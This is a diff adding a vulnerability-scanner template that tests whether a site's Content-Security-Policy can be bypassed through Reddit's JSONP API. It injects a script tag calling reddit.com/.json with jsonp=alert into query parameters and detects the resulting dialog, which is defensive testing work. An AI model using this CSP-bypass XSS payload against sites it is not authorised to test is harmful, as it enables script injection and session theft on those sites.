@@ -1,0 +1,55 @@
+id: reddit-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Reddit API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,reddit-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "reddit.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: reddit_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "reddit_api_csp_xss == true"
+# digest: 4a0a0047304502206bdcbae7de99a58f6a71b0db5d7a3417360dd96030c449ff684f5b41470b70cd022100939bd82e510445ec5a9c47ef2518e19609b4dee43f2317c534cbbfb05b93e759:922c64590222798bb761d5b6d8e72950
